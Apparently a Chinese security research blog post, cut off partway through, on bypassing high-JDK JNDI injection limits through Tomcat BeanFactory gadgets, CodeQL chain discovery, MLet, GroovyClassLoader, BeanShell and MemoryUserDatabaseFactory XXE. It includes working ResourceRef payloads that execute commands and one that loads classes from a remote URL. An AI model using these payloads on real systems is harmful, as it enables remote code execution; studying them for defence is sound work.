> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/gBuKDjRfnbJDv6TG5F6q3w)

最近`Log4j`的漏洞引起了很多师傅对JNDI注入漏洞利用的研究，`浅蓝`师傅的文章探索高版本 JDK 下 JNDI漏洞的利用方法提出了很多关于绕过JNDI高版本限制的方法，本文主要是对文章中的部分方法进行分析并加上一些我个人的思考。

前言
--

在分析这些具体的方法前，我们先对绕过的整体思路做一个阐述。目前高版本JDK的防护方式主要是针对加载远程的`ObjectFactory`的加载做限制，只有开启了某些属性后才会通过指定的远程地址获取`ObjectFactory`的Class并实例化，进而通过`ObjectFactory#getObjectInstance`来获取返回的真实对象。但是在加载远程地址获取`ObjectFactory`前，首先在本地`ClassPath`下加载指定的`ObjectFactory`，本地加载`ObjectFactory`失败后才会加载远程地址的`ObjectFactory`，所以一个主要的绕过思路就是加载本地ClassPath下的`ObjectFactory`。

```


1.  `static ObjectFactory getObjectFactoryFromReference(`
    
2.   `Reference ref, String factoryName)`
    
3.   `throws IllegalAccessException,`
    
4.   `InstantiationException,`
    
5.   `MalformedURLException {`
    
6.   `Class<?> clas = null;`
    
7.   `// 首先加载当前环境下ClassPath下的ObjectFactory`
    
8.   `try {`
    
9.   `clas = helper.loadClass(factoryName);`
    
10.   `} catch (ClassNotFoundException e) {`
    
11.   `// ignore and continue`
    
12.   `// e.printStackTrace();`
    
13.   `}`
    
14.   `// All other exceptions are passed up.`
    
15.   `// 当前ClassPath加载失败才会加载classFactoryLocation中指定地址的ObjectFactory`
    
16.   `String codebase;`
    
17.   `if (clas == null &&`
    
18.   `(codebase = ref.getFactoryClassLocation()) != null) {`
    
19.   `try {`
    
20.   `clas = helper.loadClass(factoryName, codebase);`
    
21.   `} catch (ClassNotFoundException e) {`
    
22.   `}`
    
23.   `}`
    
24.   `return (clas != null) ? (ObjectFactory) clas.newInstance() : null;`
    
25.   `}`
    


```

所以我们需要找到一个`javax.naming.spi.ObjectFactory`接口的实现类，在这个实现类的`getObjectInstance`可以实现一些恶意操作。但是在JDK提供的原生实现类里其实并没有操作空间。所以下面我们主要的思路就是在一些常用的框架或者组件中寻找可利用的ObjectFactory实现类。

![](https://mmbiz.qpic.cn/mmbiz_png/ofBa42GG7SjtsAibXhcFloZMbDdibhKrDQX1zZ9g8YqibBl6jQGCERUxqia7NMehwldsbm1ibNjRQsKZZ8FRMKBTo1A/640?wx_fmt=png)

常规绕过方式总结
--------

Tomcat下的绕过比较精彩的并不是EL表达式利用，而是通过`BeanFactory#getObjectInstance`将这个漏洞的利用面从仅仅只能从`ObjectFactory`实现类的`getObjectInstance`方法利用扩展为一次可以调用”任意”类的”任意”方法的机会，但是对调用的类和方法以及参数有些限制。

*   该类必须包含public无参构造方法
    
*   调用的方法必须是public方法
    
*   调用的方法只有一个参数并且参数类型为String类型
    

所以下面我们只要找到某个类的某个方法既满足了上面的条件又实现我们想要的功能。

*   `javax.el.ELProcessor#eval`执行命令，但是`ELProcessor`是在Tomcat8才引入的。
    
*   `groovy.lang.GroovyShell#evaluate(java.lang.String)`通过Groovy执行命令。
    
*   `com.thoughtworks.xstream.XStream().fromXML(String)`通过调用`XStream`转换XML时的反序列化漏洞导致的RCE，这里之所以选择`XStream`是因为Xstream的反序列化漏洞和影响版本比较多。JSON的转换的漏洞相对来说通用性不高。
    
*   `org.yaml.snakeyaml.Yaml#load(java.lang.String)`加载Yaml时的反序列化漏洞，在SpringBoot中经常会使用`snakeyaml`来进行yml配置文件的解析。
    
*   `org.mvel2.MVEL#eval(String)`执行命令，这里`浅蓝`师傅文章中提到的是`MVEL`类是private所以要找上层调用，我在`2.0.17`中测试`Mvel`是存在public无参构造方法的，高版本确实换成了private构造方法。所以只能找那里调用了`Mvel#eval`方法，而`org.mvel2.sh.ShellSession#exec`调用了`Mvel#eval`，因此可以通过`ShellSession#exec`来间接完成调用。
    
*   `com.sun.glass.utils.NativeLibLoader#loadLibrary(String)`加载DLL，前提是我们已经将构造好的DLL上传至目标上，所以局限性比较大。
    

CodeQL分析MVEL调用链挖掘过程
-------------------

上面这些利用方法原理理解都比较简单，但是作者怎么找到`org.mvel2.sh.ShellSession#exec`的过程我比较好奇，排除他已知这个方法可以调用外，我们可以思考一下作者如何找到这个方法的。要找到这个方法的思路其实比较简单，可以按照下面的思路。

*   除了`org.mvel2.MVEL#eval(String)`可以执行命令其他重载的eval方法也可以执行命令
    
*   查找调用这些eval方法的调用，直到找到一个调用类存在public构造方法且间接调用eval的方法也是public类型并且参数为string类型
    

但是如果手动找的话其实比较麻烦，因为调用eval方法的函数其实比较多，如下图所示。

![](https://mmbiz.qpic.cn/mmbiz_png/ofBa42GG7SjtsAibXhcFloZMbDdibhKrDQKgLAg7kKHvpGFbSUWz1icQm5nhslmiccRAH0EnOFc6DiayDk9CcIPoNNw/640?wx_fmt=png)

所以我想用CodeQL来帮我们做这件事情，由于MVEL是github上的开源项目，所以可以直接在这里下载到数据库。由于eval方法的第一个参数是要执行的表达式，所以我们将这个参数作为sink，source的名称我们不做限制，但是要限制方法的参数为string且只有一个参数，代码如下：

```


1.  `/**`
    
2.   `*@name Tainttrack Context lookup`
    
3.   `*@kind path-problem`
    
4.   `*/`
    
5.  `import java`
    
6.  `import semmle.code.java.dataflow.FlowSources`
    
7.  `import DataFlow::PathGraph`
    
8.  `class MVEL extends  RefType{`
    
9.   `MVEL(){`
    
10.   `this.hasQualifiedName("org.mvel2", "MVEL")`
    
11.    
    
12.   `}`
    
13.  `}`
    
14.  `//限制参数的类型和数量`
    
15.  `class CallEval extends  Method {`
    
16.   `CallEval(){`
    
17.   `this.getNumberOfParameters() = 1 and this.getParameter(0).getType() instanceof TypeString`
    
18.   `}`
    
19.   `Parameter getAnUntrustedParameter() { result = this.getParameter(0) }`
    
20.  `}`
    
21.  `//限制方法的名称和类型`
    
22.  `predicate isEval(Expr arg) {`
    
23.   `exists(MethodAccess ma |`
    
24.   `ma.getMethod().getName()="eval"`
    
25.   `and`
    
26.   `ma.getMethod().getDeclaringType() instanceof MVEL`
    
27.   `and`
    
28.   `arg = ma.getArgument(0)`
    
29.   `)`
    
30.  `}`
    
31.  `class TainttrackLookup  extends TaintTracking::Configuration {`
    
32.   `TainttrackLookup() {` 
    
33.   `this = "TainttrackLookup"` 
    
34.   `}`
    
35.    
    
36.   `override predicate isSource(DataFlow::Node source) {`
    
37.   `exists(CallEval evalMethod |`
    
38.   `source.asParameter() = evalMethod.getAnUntrustedParameter())`
    
39.   `}`
    
40.   `override predicate isSink(DataFlow::Node sink) {`
    
41.   `exists(Expr arg |`
    
42.   `isEval(arg)`
    
43.   `and`
    
44.   `sink.asExpr() = arg`
    
45.   `)`
    
46.   `}`
    
47.  `}` 
    
48.  `from TainttrackLookup config , DataFlow::PathNode source, DataFlow::PathNode sink`
    
49.  `where`
    
50.   `config.hasFlowPath(source, sink)`
    
51.  `select sink.getNode(), source, sink, "unsafe lookup", source.getNode(), "this is user input"`
    


```

但是跑完以后去掉一些看上去有问题的链后并没有找到`浅蓝`师傅发现的那个调用链，只找到了下面的调用链，但是也是在`MVEL`类中的，所以也不能利用。

![](https://mmbiz.qpic.cn/mmbiz_png/ofBa42GG7SjtsAibXhcFloZMbDdibhKrDQpbQrheE9G26W96jv7qYcVCnibpkiamOicCIosCcW1JmdFMicMBHVfxjx9w/640?wx_fmt=png)

下面分析下为什么没跑出来，首先看下我们设置的sink是否有问题，sink确实可以找到`PushContext#execute`方法，所以sink这里没有问题。

![](https://mmbiz.qpic.cn/mmbiz_png/ofBa42GG7SjtsAibXhcFloZMbDdibhKrDQDq2r9icn2vgtb82yEshicBZAjiaOF8EDYfdRO1UbnwTQprRXK7350nBzg/640?wx_fmt=png)

再通过下面的代码检测source是否设置正确，也没有问题，所以说明在污点传播的过程中被打断了。

![](https://mmbiz.qpic.cn/mmbiz_png/ofBa42GG7SjtsAibXhcFloZMbDdibhKrDQkFq3PK6ibHCianpoH8rUdTCnn8EcXohHv6VATfxDCRsmxwDzg5mlgzqg/640?wx_fmt=png)

经过分析，猜测可能打断污点传播的点有两处。

*   exec方法直接将参数添加到`inBuffer`中并调用了无参构造方法，如果分析中认为调用无参构造方法就认为污点会被打断那么这里就会导致污点传播被打断
    

![](https://mmbiz.qpic.cn/mmbiz_png/ofBa42GG7SjtsAibXhcFloZMbDdibhKrDQZXr5BcQDB71zCU5H2E82WKSHcsSicH4AfNia2EB27DsD6UVEc2EeuP7g/640?wx_fmt=png)

*   在`_exec`中通过`arraycopy`完成了`passParameters`的赋值操作，如果CodeQL这里没分析好也会导致污点传播被打断。
    

![](https://mmbiz.qpic.cn/mmbiz_png/ofBa42GG7SjtsAibXhcFloZMbDdibhKrDQtHmicksApbthPUOib8vfia3s34GwicH4zrjS5BBwGCAoHL6v5icL1V2QzicQ/640?wx_fmt=png)

首先分析第一种情况，在`_exec`中将`inBuffer`的值封装为`inTokens`后调用了`containsKey`方法，所以我们在不更改source的情况下将sink更改为对`containsKey`的调用。

![](https://mmbiz.qpic.cn/mmbiz_png/ofBa42GG7SjtsAibXhcFloZMbDdibhKrDQB7goHj71hxRuiaFlYElxBvGWWQbIkIUI71EzTsBicCzPicmulzrcKWokw/640?wx_fmt=png)

```


1.  `predicate isEval(Expr arg) {`
    
2.   `exists(MethodAccess ma |`
    
3.   `ma.getMethod().getName()="containsKey"`
    
4.   `and`
    
5.   `arg = ma.getArgument(0)`
    
6.   `)`
    
7.  `}`
    


```

可以看到确实是可以从`ShellSession#exec`追踪到`commands.containsKey`中的，所以第一种假设就被推翻了。

![](https://mmbiz.qpic.cn/mmbiz_png/ofBa42GG7SjtsAibXhcFloZMbDdibhKrDQicuOsuWGibFX97ZCEiaW1ShEecfUX93On9GM3bgpcAd4p0B4BOHiaAAqXg/640?wx_fmt=png)

再来看第二种猜测，只要我们编写一个`isAdditionalTaintStep`将arraycopy的第1个参数和`execute`的第2个参数接起来即可。

```


1.  `override predicate isAdditionalTaintStep(DataFlow::Node fromNode, DataFlow::Node toNode) {`
    
2.   `exists(MethodAccess ma,MethodAccess ma2 |`
    
3.   `ma.getMethod().getDeclaringType().hasQualifiedName("java.lang", "System")` 
    
4.   `and ma.getMethod().hasName("arraycopy") and fromNode.asExpr()=ma.getArgument(0)` 
    
5.   `and ma2.getMethod().getDeclaringType().hasQualifiedName("org.mvel2.sh", "Command")` 
    
6.   `and ma2.getMethod().hasName("execute") and toNode.asExpr()=ma2.getArgument(1)`
    
7.   `)`
    
8.   `}`
    


```

最终就可以拿到`浅蓝`师傅发现的调用链。

![](https://mmbiz.qpic.cn/mmbiz_png/ofBa42GG7SjtsAibXhcFloZMbDdibhKrDQB5qRiadBrC8baQcYFaWps8riaJSYVD0iaWQAicOZC4Iuv3WRicNvpD4mgFA/640?wx_fmt=png)

MLet利用方式分析
----------

MLet是UrlClassLoader的子类，因此理论上可以通过loadClass加载远程地址的类进行利用，代码如下：

```


1.  `MLet mLet = new MLet();`
    
2.  `mLet.addURL("http://127.0.0.1:2333/");`
    
3.  `mLet.loadClass("Exploit");`
    


```

### 失败的利用分析

虽然说loadClass在加载以后没有newInstance不能触发类的初始化操作，但是在BeanFactory中本身就会根据我们传入的名称来实例化对象，如果我们发送两次请求，第一次通过UrlClassLoader加载到内存，由于在loadClass加载的过程中有个缓存机制，如果已经加载过的类会直接返回，我们在第二次请求中直接让实例化这个类不就可以了。

```


1.  `protected Class<?> loadClass(String name, boolean resolve)`
    
2.   `throws ClassNotFoundException`
    
3.   `{`
    
4.   `synchronized (getClassLoadingLock(name)) {`
    
5.   `// First, check if the class has already been loaded`
    
6.   `Class<?> c = findLoadedClass(name);`
    
7.   `if (c == null) {`
    
8.   `long t0 = System.nanoTime();`
    


```

但实际是不行的，因为BeanFactory中获取到类名后是通过`Thread.currentThread().getContextClassLoader()`这个加载器来加载类的，而这个类加载器肯定不是`Mlet`那个加载器，所以它没有加载过我们创建的恶意类，自然也获取不到了。

```


1.  `if (obj instanceof ResourceRef) {`
    
2.   `try {`
    
3.   `//从引用对象中获取类名`
    
4.   `Reference ref = (Reference)obj;`
    
5.   `String beanClassName = ref.getClassName();`
    
6.   `Class<?> beanClass = null;`
    
7.   `//获取加载器加载类`
    
8.   `ClassLoader tcl = Thread.currentThread().getContextClassLoader();`
    
9.   `if (tcl != null) {`
    
10.   `try {`
    
11.   `beanClass = tcl.loadClass(beanClassName);`
    
12.   `} catch (ClassNotFoundException var26) {`
    
13.   `}`
    
14.   `} else {`
    
15.   `try {`
    
16.   `beanClass = Class.forName(beanClassName);`
    
17.   `} catch (ClassNotFoundException var25) {`
    
18.   `var25.printStackTrace();`
    
19.   `}`
    
20.   `}`
    


```

### 方法多次调用分析

那么Mlet为什么可以调用多个方法，因为按照我们前面的分析，只会调用一个方法。下面我们简要分析下`org.apache.naming.factory.BeanFactory#getObjectInstance`。

*   从引用对象中获取类名并实例化，这里需要注意的是 这个类只实例化了一次 。再从forceString属性中获取内容并通过`,`分割转换为数组，遍历数组中的内容并根据`=`分割获取要调用的方法名获取method对象并保存到Map中。
    

```


1.  `if (obj instanceof ResourceRef) {`
    
2.   `try {`
    
3.   `//从引用对象中获取类名`
    
4.   `Reference ref = (Reference)obj;`
    
5.   `String beanClassName = ref.getClassName();`
    
6.   `Class<?> beanClass = null;`
    
7.   `//获取加载器加载类`
    
8.   `ClassLoader tcl = Thread.currentThread().getContextClassLoader();`
    
9.   `if (tcl != null) {`
    
10.   `try {`
    
11.   `beanClass = tcl.loadClass(beanClassName);`
    
12.   `} catch (ClassNotFoundException var26) {`
    
13.   `}`
    
14.   `} else {`
    
15.   `try {`
    
16.   `beanClass = Class.forName(beanClassName);`
    
17.   `} catch (ClassNotFoundException var25) {`
    
18.   `var25.printStackTrace();`
    
19.   `}`
    
20.   `}`
    
21.   `//加载失败抛出异常`
    
22.   `if (beanClass == null) {`
    
23.   `throw new NamingException("Class not found: " + beanClassName);`
    
24.   `} else {`
    
25.   `BeanInfo bi = Introspector.getBeanInfo(beanClass);`
    
26.   `PropertyDescriptor[] pda = bi.getPropertyDescriptors();`
    
27.   `//获取class的对应的对象，只实例化了一次`
    
28.   `Object bean = beanClass.getConstructor().newInstance();`
    
29.   `//从forceString中获取引用属性`
    
30.   `RefAddr ra = ref.get("forceString");`
    
31.   `Map<String, Method> forced = new HashMap();`
    
32.   `String value;`
    
33.   `String propName;`
    
34.   `int i;`
    
35.   `if (ra != null) {`
    
36.   ``//获取forceString的内容并通过`,`分割``
    
37.   `value = (String)ra.getContent();`
    
38.   `//paramTypes为String类型`
    
39.   `Class<?>[] paramTypes = new Class[]{String.class};`
    
40.   `String[] var18 = value.split(",");`
    
41.   `i = var18.length;`
    
42.   `for(int var20 = 0; var20 < i; ++var20) {`
    
43.   `String param = var18[var20];`
    
44.   `param = param.trim();`
    
45.   `//根据等号分割获取propName和param,如果没有等号则转成setter方法`
    
46.   `int index = param.indexOf(61);`
    
47.   `if (index >= 0) {`
    
48.   `propName = param.substring(index + 1).trim();`
    
49.   `param = param.substring(0, index).trim();`
    
50.   `} else {`
    
51.   `propName = "set" + param.substring(0, 1).toUpperCase(Locale.ENGLISH) + param.substring(1);`
    
52.   `}`
    
53.   `//通过propName和paramTypes获取Method并放到param中`
    
54.   `try {`
    
55.   `forced.put( , beanClass.getMethod(propName, paramTypes));`
    
56.   `} catch (SecurityException | NoSuchMethodException var24) {`
    
57.   `throw new NamingException("Forced String setter " + propName + " not found for property " + param);`
    
58.   `}`
    
59.   `}`
    
60.   `}`
    


```

*   下面获取引用对象中保存的所有属性，通过while循环遍历属性内容并赋值给valueArray作为参数最终通过invoke完成反射调用。这里需要注意的是 反射调用是在while循环中的，所以可以调用多个方法 。
    

```


1.  `//从引用对象中获取所有的属性`
    
2.   `Enumeration e = ref.getAll();`
    
3.   `//遍历属性`
    
4.  `while(true) {`
    
5.   `while(true) {`
    
6.   `do {`
    
7.   `do {`
    
8.   `do {`
    
9.   `do {`
    
10.   `do {`
    
11.   `if (!e.hasMoreElements()) {`
    
12.   `return bean;`
    
13.   `}`
    
14.   `·                                            //获取属性`
    
15.   `ra = (RefAddr)e.nextElement();`
    
16.   `//获取propName`
    
17.   `propName = ra.getType();`
    
18.   `//如果propName是下面的值则跳过`
    
19.   `} while(propName.equals("factory"));`
    
20.   `} while(propName.equals("scope"));`
    
21.   `} while(propName.equals("auth"));`
    
22.   `} while(propName.equals("forceString"));`
    
23.   `} while(propName.equals("singleton"));`
    
24.   `//获取属性中的内容`
    
25.   `value = (String)ra.getContent();`
    
26.   `Object[] valueArray = new Object[1];`
    
27.   `//根据propName从map中获取method`
    
28.   `Method method = (Method)forced.get(propName);`
    
29.   `if (method != null) {`
    
30.   `//将属性中的内容赋给valueArray`
    
31.   `valueArray[0] = value;`
    
32.   `try {`
    
33.   `//反射调用方法`
    
34.   `method.invoke(bean, valueArray);`
    
35.   `} catch (IllegalArgumentException | InvocationTargetException | IllegalAccessException var23) {`
    
36.   `throw new NamingException("Forced String setter " + method.getName() + " threw exception for property " + propName);`
    
37.   `}`
    
38.   `}`
    


```

所以通过上面的分析发现其实在`BeanFactory`中其实可以调用多个方法，但是这些方法必须都在同一个Class中。并且  
由于在这个过程中Class只被实例化了一次，因此可以通过调用不同的方法为Class的属性赋值 。

下来再看这个poc就可以理解为什么可以这么构造了。

```


1.  `ResourceRef ref = new ResourceRef("javax.management.loading.MLet", null, "", "",`
    
2.   `true, "org.apache.naming.factory.BeanFactory", null);`
    
3.   `//指定要调用的方法名`
    
4.   `ref.add(new StringRefAddr("forceString", "b=addURL,c=loadClass"));`
    
5.   `//为不同的方法的参数赋值`
    
6.   `ref.add(new StringRefAddr("b", "http://127.0.0.1:2333/"));`
    
7.   `ref.add(new StringRefAddr("c", "Blue"));`
    
8.   `return ref;`
    


```

失败的UrlClassLoader调用链挖掘尝试
------------------------

通过`Mlet`的加载虽然不能利用，但是我们也可以学习到`浅蓝`师傅挖掘调用链的思路，即通过UrlClassLoader的实现类寻找可以加载远程类的代码。

我们也可以尝试去挖掘对UrlClassLoader的调用，相关的调用需要满足以下条件：

*   存在public构造方法
    
*   继承UrlClassLoader并调用了loadClass方法
    

`WebappClassLoaderBase`似乎满足条件，虽然这个类本身没有public构造方法，但是其子类`WebappClassLoader`是有无参构造方法的。但是由于`WebappClassLoaderBase`的`addURL`方法不是public类型的，所以无法利用。

![](https://mmbiz.qpic.cn/mmbiz_png/ofBa42GG7SjtsAibXhcFloZMbDdibhKrDQycJZ8PRFHFTaAv3T3KVSY5Nvrly6qqpG2icic7WzgcY4zrfNBycgVlCw/640?wx_fmt=png)

`org.codehaus.plexus.compiler.javac.IsolatedClassLoader`满足上面的条件，但是addURL方法的参数不是String类型，所以也无法利用。

```


1.  `public class IsolatedClassLoader extends URLClassLoader {`
    
2.   `private ClassLoader parentClassLoader = ClassLoader.getSystemClassLoader();`
    
3.   `public IsolatedClassLoader() {`
    
4.   `super(new URL[0], (ClassLoader)null);`
    
5.   `}`
    
6.   `public void addURL(URL url) {`
    
7.   `super.addURL(url);`
    
8.   `}`
    
9.   `public synchronized Class<?> loadClass(String className) throws ClassNotFoundException {`
    
10.   `Class<?> c = this.findLoadedClass(className);`
    
11.   `ClassNotFoundException ex = null;`
    
12.   `if (c == null) {`
    
13.   `try {`
    
14.   `c = this.findClass(className);`
    
15.   `} catch (ClassNotFoundException var5) {`
    
16.   `ex = var5;`
    
17.   `if (this.parentClassLoader != null) {`
    
18.   `c = this.parentClassLoader.loadClass(className);`
    
19.   `}`
    
20.   `}`
    
21.   `}`
    
22.   `if (c == null) {`
    
23.   `throw ex;`
    
24.   `} else {`
    
25.   `return c;`
    
26.   `}`
    
27.   `}`
    
28.  `}`
    


```

所以似乎没有其他可以直接利用的ClassLoader了。

GroovyClassLoader执行命令分析
-----------------------

那么为什么`GroovyClassLoader`可以加载远程的class并执行里面的内容呢？

首先在`addClasspath`中会将我们传入的path转换为URI并添加到当前的`GroovyClassLoader`对象中。

```


1.  `public void addClasspath(final String path) {`
    
2.   `AccessController.doPrivileged(new PrivilegedAction<Void>() {`
    
3.   `public Void run() {`
    
4.   `try {`
    
5.   `URI newURI;`
    
6.   `//正则匹配\p{Alpha}[-+.\p{Alnum}]*:[^\\]*,如果我们传入的是http的url是不会被匹配到的`
    
7.   `if (!GroovyClassLoader.URI_PATTERN.matcher(path).matches()) {`
    
8.   `newURI = (new File(path)).toURI();`
    
9.   `} else {`
    
10.   `//根据传入的path构建url对象`
    
11.   `newURI = new URI(path);`
    
12.   `}`
    
13.   `//获取GroovyClassLoader中保存的url`
    
14.   `URL[] urls = GroovyClassLoader.this.getURLs();`
    
15.   `URL[] arr$ = urls;`
    
16.   `int len$ = urls.length;`
    
17.   `//判断newURI是否在url列表中`
    
18.   `for(int i$ = 0; i$ < len$; ++i$) {`
    
19.   `URL url = arr$[i$];`
    
20.   `if (newURI.equals(url.toURI())) {`
    
21.   `return null;`
    
22.   `}`
    
23.   `}`
    
24.   `//将url添加到GroovyClassLoader对象中`
    
25.   `GroovyClassLoader.this.addURL(newURI.toURL());`
    
26.   `} catch (MalformedURLException var7) {`
    
27.   `} catch (URISyntaxException var8) {`
    
28.   `}`
    
29.   `return null;`
    
30.   `}`
    
31.   `});`
    
32.   `}`
    


```

`GroovyClassLoader#loadClass`首先通过UrlClassLoader根据我们传入的名称加载远程的Class，加载失败后则根据名称加载groovy，加载成功后会对远程加载的groovy代码编译。

```


1.  `public Class loadClass(String name, boolean lookupScriptFiles, boolean preferClassOverScript, boolean resolve) throws ClassNotFoundException, CompilationFailedException {`
    
2.   `Class cls = this.getClassCacheEntry(name);`
    
3.   `boolean recompile = this.isRecompilable(cls);`
    
4.   `if (!recompile) {`
    
5.   `return cls;`
    
6.   `} else {`
    
7.   `ClassNotFoundException last = null;`
    
8.   `try {`
    
9.   `//首先通过UrlClassLoader加载类加载成功则返回，失败则继续执行`
    
10.   `Class parentClassLoaderClass = super.loadClass(name, resolve);`
    
11.   `if (cls != parentClassLoaderClass) {`
    
12.   `return parentClassLoaderClass;`
    
13.   `}`
    
14.   `} catch (ClassNotFoundException var19) {`
    
15.   `last = var19;`
    
16.   `} catch (NoClassDefFoundError var20) {`
    
17.   `if (var20.getMessage().indexOf("wrong name") <= 0) {`
    
18.   `throw var20;`
    
19.   `}`
    
20.   `last = new ClassNotFoundException(name);`
    
21.   `}`
    
22.   `SecurityManager sm = System.getSecurityManager();`
    
23.   `if (sm != null) {`
    
24.   `String className = name.replace('/', '.');`
    
25.   `int i = className.lastIndexOf(46);`
    
26.   `if (i != -1 && !className.startsWith("sun.reflect.")) {`
    
27.   `sm.checkPackageAccess(className.substring(0, i));`
    
28.   `}`
    
29.   `}`
    
30.   `if (cls != null && preferClassOverScript) {`
    
31.   `return cls;`
    
32.   `} else {`
    
33.   `if (lookupScriptFiles) {`
    
34.   `try {`
    
35.   `//从缓存中先获取Class`
    
36.   `Class classCacheEntry = this.getClassCacheEntry(name);`
    
37.   `if (classCacheEntry != cls) {`
    
38.   `Class var24 = classCacheEntry;`
    
39.   `return var24;`
    
40.   `}`
    
41.   `//根据名称获取远程groovy的url`
    
42.   `URL source = this.resourceLoader.loadGroovySource(name);`
    
43.   `Class oldClass = cls;`
    
44.   `cls = null;`
    
45.   `//编译groovy代码`
    
46.   `cls = this.recompile(source, name, oldClass);`
    
47.   `} catch (IOException var17) {`
    
48.  `....`
    
49.   `}`
    
50.   `}`
    


```

![](https://mmbiz.qpic.cn/mmbiz_png/ofBa42GG7SjtsAibXhcFloZMbDdibhKrDQs42dxK3KDWSmaxR4LqIPakVYtMCGxIfCjbmLhGdMicLtWD6RHumgI4w/640?wx_fmt=png)

在`recompile`中判断URL是否是文件类型，如果不是则加载远程url中指定的groovy并进行parse。

```


1.  `protected Class recompile(URL source, String className, Class oldClass) throws CompilationFailedException, IOException {`
    
2.   `if (source == null || (oldClass == null || !this.isSourceNewer(source, oldClass)) && oldClass != null) {`
    
3.   `return oldClass;`
    
4.   `} else {`
    
5.   `synchronized(this.sourceCache) {`
    
6.   `String name = source.toExternalForm();`
    
7.   `this.sourceCache.remove(name);`
    
8.   `//判断是否为本地file`
    
9.   `if (this.isFile(source)) {`
    
10.   `Class var10000;`
    
11.   `try {`
    
12.   `var10000 = this.parseClass(new GroovyCodeSource(new File(source.toURI()), this.config.getSourceEncoding()));`
    
13.   `} catch (URISyntaxException var8) {`
    
14.   `return this.parseClass(source.openStream(), name);`
    
15.   `}`
    
16.   `return var10000;`
    
17.   `} else {`
    
18.   `//加载url中指定的groovy`
    
19.   `return this.parseClass(source.openStream(), name);`
    
20.   `}`
    
21.   `}`
    
22.   `}`
    
23.   `}`
    


```

而在parseClass的过程中会执行`@ASTTest`中的代码，因此可以命令执行。

```


1.  `@groovy.transform.ASTTest(value={assert Runtime.getRuntime().exec("/System/Applications/Calculator.app/Contents/MacOS/Calculator")})`
    
2.  `class Person{}`
    


```

在查找资料的过程中，发现浅析JNDI注入Bypass中也提到了Groovy的绕过利用,可以看到这里其实可以直接调用`GroovyClassLoader#parseClass`并传入我们构造好的内容执行命令。

```


1.  `ResourceRef ref = new ResourceRef("groovy.lang.GroovyClassLoader", null, "", "", true,"org.apache.naming.factory.BeanFactory",null);`
    
2.   `ref.add(new StringRefAddr("forceString", "x=parseClass"));`
    
3.   `String script = "@groovy.transform.ASTTest(value={\n" +`
    
4.   `"    assert java.lang.Runtime.getRuntime().exec(\"calc\")\n" +`
    
5.   `"})\n" +`
    
6.   `"def x\n";`
    
7.   `ref.add(new StringRefAddr("x",script));`
    


```

命令执行利用链挖掘
---------

除了寻找UrlClassLoader加载远程类外，还有一个思路是寻找可以执行命令的点，那么为什么`ScriptEngine`作为JDK自带的可以执行命令的方式不行呢？

因为通过`ScriptEngine`来执行命令，都需要两个参数，所以不能通过ScriptEngine调用执行命令。

```


1.  `public Object eval(String script, Bindings bindings) throws ScriptException {`
    
2.   `ScriptContext ctxt = getScriptContext(bindings);`
    
3.   `return eval(script , ctxt);`
    
4.   `}`
    
5.   `public Object eval(Reader reader, ScriptContext ctxt) throws ScriptException {`
    
6.   `return this.evalImpl(makeSource(reader, ctxt), ctxt);`
    
7.   `}`
    


```

尝试通过CodeQL找下`NashornScriptEngine#eval`的调用，确实也没有参数为string类型的调用，所以从原生的JDK中应该是找不到命令执行的点了。

除了上面列出的执行命令的方式外，`beanshell`也可以执行命令，并且满足我们的条件，因此也可以使用beanshell的利用方式。

```


1.  `ResourceRef ref = new ResourceRef("bsh.Interpreter", null, "", "",`
    
2.   `true, "org.apache.naming.factory.BeanFactory", null);`
    
3.   `ref.add(new StringRefAddr("forceString", "a=eval"));`
    
4.   `ref.add(new StringRefAddr("a", "exec(\"cmd.exe /c calc.exe\")"));`
    
5.   `return ref;`
    


```

![](https://mmbiz.qpic.cn/mmbiz_png/ofBa42GG7SjtsAibXhcFloZMbDdibhKrDQMb9bLuOHS7lXIKYmUxia86wk9CeLMQ3AwicqlPySfiagmE96oajibDfiaCA/640?wx_fmt=png)

MemoryUserDatabaseFactory利用链
----------------------------

上面的分析都是建立在Tomcat下的BeanFactory的利用下的，我们也可以寻找其他实现了ObjectFactory的类利用，浅蓝师傅找到的`MemoryUserDatabaseFactory`利用过程比较精彩，这里着重分析一下。

### XXE

`MemoryUserDatabaseFactory#getObjectInstance`首先创建一个`MemoryUserDatabase`对象，首先看下tomcat对这个对象的解释,和tomcat的用户有关，tomcat会将这个对象中的内容存储到xml中。

> UserDatabase的具体实现，它将所有已定义的用户、组和角色加载到内存中的数据结构中，并使用指定的XML文件进行持久存储。

创建`MemoryUserDatabase`后会从我们传入的引用对象中获取`pathname`、`database`、`readonly`并设置到新建的`MemoryUserDatabase`对象中。

```


1.  `public Object getObjectInstance(Object obj, Name name, Context nameCtx, Hashtable<?, ?> environment) throws Exception {`
    
2.   `if (obj != null && obj instanceof Reference) {`
    
3.   `Reference ref = (Reference)obj;`
    
4.   `//判断class是否是org.apache.catalina.UserDatabase`
    
5.   `if (!"org.apache.catalina.UserDatabase".equals(ref.getClassName())) {`
    
6.   `return null;`
    
7.   `} else {`
    
8.   `MemoryUserDatabase database = new MemoryUserDatabase(name.toString());`
    
9.   `RefAddr ra = null;`
    
10.   `//从引用对象中获取pathname属性`
    
11.   `ra = ref.get("pathname");`
    
12.   `if (ra != null) {`
    
13.   `//给database设置属性`
    
14.   `database.setPathname(ra.getContent().toString());`
    
15.   `}`
    
16.   `//从引用对象中获取readonly属性`
    
17.   `ra = ref.get("readonly");`
    
18.   `if (ra != null) {`
    
19.   `database.setReadonly(Boolean.parseBoolean(ra.getContent().toString()));`
    
20.   `}`
    
21.   `//从引用对象中获取watchSource属性`
    
22.   `ra = ref.get("watchSource");`
    
23.   `if (ra != null) {`
    
24.   `database.setWatchSource(Boolean.parseBoolean(ra.getContent().toString()));`
    
25.   `}`
    
26.   `//调用open`
    
27.   `database.open();`
    
28.   `//只有readonly属性为false才会进入save方法，readonly属性可以通过引用中获取`
    
29.   `if (!database.getReadonly()) {`
    
30.   `//调用save`
    
31.   `database.save();`
    
32.   `}`
    
33.   `return database;`
    
34.   `}`
    
35.   `} else {`
    
36.   `return null;`
    
37.   `}`
    
38.   `}`
    


```

`open`方法会去加载远程的xml文件并进行解析。

```


1.  `public void open() throws Exception {`
    
2.   `this.writeLock.lock();`
    
3.   `try {`
    
4.   `this.users.clear();`
    
5.   `this.groups.clear();`
    
6.   `this.roles.clear();`
    
7.   `//从之前保存的属性中获取pathName`
    
8.   `String pathName = this.getPathname();`
    
9.   `//创建URI对象`
    
10.   `URI uri = ConfigFileLoader.getURI(pathName);`
    
11.   `URLConnection uConn = null;`
